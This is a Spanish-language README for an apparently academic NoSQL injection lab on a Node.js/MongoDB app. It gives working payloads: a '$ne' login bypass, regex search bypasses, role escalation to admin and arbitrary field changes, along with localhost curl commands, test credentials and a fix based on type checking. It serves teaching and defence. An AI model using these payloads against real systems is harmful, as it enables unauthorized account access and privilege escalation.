# 🔒 NoSQL Injection Laboratory - Guía de Demostración

## 📋 Resumen de Cambios

Este proyecto ha sido mejorado para proporcionar una demostración académica **más desafiante** de vulnerabilidades NoSQL Injection. Las rutas vulnerables ahora requieren autenticación para acceder a ellas.

---

## 🎯 Niveles de Seguridad

### ✅ Producción (Seguro)
- **POST /api/auth/login** - Login seguro con validación
- **POST /api/auth/signup** - Registro seguro
- **GET /api/auth/me** - Perfil protegido con token

### ⚠️ Laboratorio (VULNERABLE)
- **POST /api/auth/login-lab** - Login vulnerable sin autenticación
- **GET /api/lab/users** - Acceso a usuarios (requiere token)
- **POST /api/lab/search-users** - Búsqueda vulnerable (requiere token)
- **POST /api/lab/update-user** - Actualización vulnerable (requiere token)

---

## 🚀 Flujo de Demostración

### Paso 1: Bypass de Login (NoSQL Injection)

**Endpoint:** `POST /api/auth/login-lab`

**Intento Normal:**
```json
{
  "username": "alice",
  "password": "user123"
}
```

**Bypass con NoSQL Injection** ✅:
```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

**Respuesta Exitosa:**
```json
{
  "message": "✅ Login exitoso (Laboratorio)",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "...",
    "username": "admin",
    "email": "admin01@gmail.com",
    "role": "admin"
  }
}
```

**Explicación:** 
El operador `$ne` (not equal) significa "no es igual a null". Esto retorna el **primer usuario** en la base de datos que cumpla la condición.

---

### Paso 2: Acceder a Datos con Token

**Endpoint:** `GET /api/lab/users`

**Headers:**
```
Authorization: Bearer YOUR_TOKEN_HERE
```

**Respuesta:**
```json
{
  "total": 3,
  "usuarios": [
    {
      "id": "...",
      "username": "admin",
      "email": "admin01@gmail.com",
      "role": "admin",
      "createdAt": "..."
    },
    {
      "id": "...",
      "username": "alice",
      "email": "alice@streamlab.com",
      "role": "user",
      "createdAt": "..."
    },
    {
      "id": "...",
      "username": "carlos",
      "email": "carlos@streamlab.com",
      "role": "user",
      "createdAt": "..."
    }
  ]
}
```

---

### Paso 3: Modificar Datos (Escalada de Privilegios)

**Endpoint:** `POST /api/lab/update-user`

**Headers:**
```
Authorization: Bearer YOUR_TOKEN_HERE
Content-Type: application/json
```

**Cuerpo - Cambiar rol a admin:**
```json
{
  "username": "alice",
  "campo": "role",
  "valor": "admin"
}
```

**Respuesta:**
```json
{
  "status": "✅ ACTUALIZACIÓN EXITOSA",
  "usuario": {
    "id": "...",
    "username": "alice",
    "email": "alice@streamlab.com",
    "role": "admin"
  }
}
```

---

## 💡 Técnicas de Ataque

### 1. Operadores MongoDB Comunes
```javascript
{ "$ne": null }        // Not Equal
{ "$gt": 0 }           // Greater Than
{ "$regex": ".*" }     // Regular Expression
{ "$or": [{}, {}] }    // OR logic
{ "$and": [{}, {}] }   // AND logic
{ "$exists": true }    // Field Exists
```

### 2. Bypass de Búsqueda
```json
{
  "username": { "$regex": ".*" },
  "email": { "$regex": ".*" }
}
```

### 3. Cambio de Campos Arbitrarios
```json
{
  "username": "alice",
  "campo": "email",
  "valor": "hacker@evil.com"
}
```

---

## 🔐 Rutas Protegidas

Las siguientes rutas **requieren token de autenticación**:

- `GET /api/lab/users`
- `POST /api/lab/search-users`
- `POST /api/lab/update-user`
- `POST /buscar-usuario` (protegida ahora)
- `POST /actualizar` (protegida ahora)

**Cómo enviar token:**
```bash
curl -H "Authorization: Bearer TOKEN_AQUÍ" http://localhost:3000/api/lab/users
```

---

## 📊 Estructura de Usuarios de Prueba

```
Admin (Por defecto)
├── username: admin
├── password: admin0101001
├── email: admin01@gmail.com
└── role: admin

Usuario 1
├── username: alice
├── password: user123
├── email: alice@streamlab.com
└── role: user

Usuario 2
├── username: carlos
├── password: carlos123
├── email: carlos@streamlab.com
└── role: user
```

---

## 🛡️ Diferencias Entre Rutas

| Característica | /api/auth/login | /api/auth/login-lab |
|---|---|---|
| Validación | ✅ Sí | ❌ No |
| NoSQL Injection | 🛡️ Protegido | ⚠️ Vulnerable |
| Token requerido | - | - |
| Producción | ✅ Segura | ❌ Lab |

---

## 🎓 Propósito Académico

Esta demostración tiene como objetivo:

1. **Entender** cómo funciona NoSQL Injection en MongoDB
2. **Demostrar** el impacto de una validación insuficiente
3. **Aprender** a proteger consultas de bases de datos
4. **Practicar** técnicas de seguridad en aplicaciones Node.js

---

## ⚠️ Advertencia Legal

**Este código es SOLO para propósitos educativos.** 
- No usar en producción
- No usar contra sistemas sin autorización
- Esta es una herramienta de aprendizaje académico

---

## 📝 Notas Técnicas

### ¿Por qué es vulnerable login-lab?

El código no valida el tipo de datos:

```javascript
// ❌ VULNERABLE
const user = await User.findOne({ username, password });

// ✅ SEGURO
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: "Entrada inválida" });
}
const user = await User.findOne({ username, password });
```

### Protecciones Implementadas

- Las rutas de laboratorio **requieren token**
- Las rutas públicas /buscar-usuario y /actualizar **ahora necesitan autenticación**
- Las rutas de producción mantienen validación segura
- Comentarios claros identifican código vulnerable

---

## 🔄 Endpoints para CURL

### 1. Login vulnerable (sin autenticación)
```bash
curl -X POST http://localhost:3000/api/auth/login-lab \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

### 2. Obtener usuarios (con autenticación)
```bash
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/api/lab/users
```

### 3. Actualizar usuario (con autenticación)
```bash
curl -X POST http://localhost:3000/api/lab/update-user \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","campo":"role","valor":"admin"}'
```

---

**Última actualización:** 2026
**Versión:** 2.0 - Nivel Medio
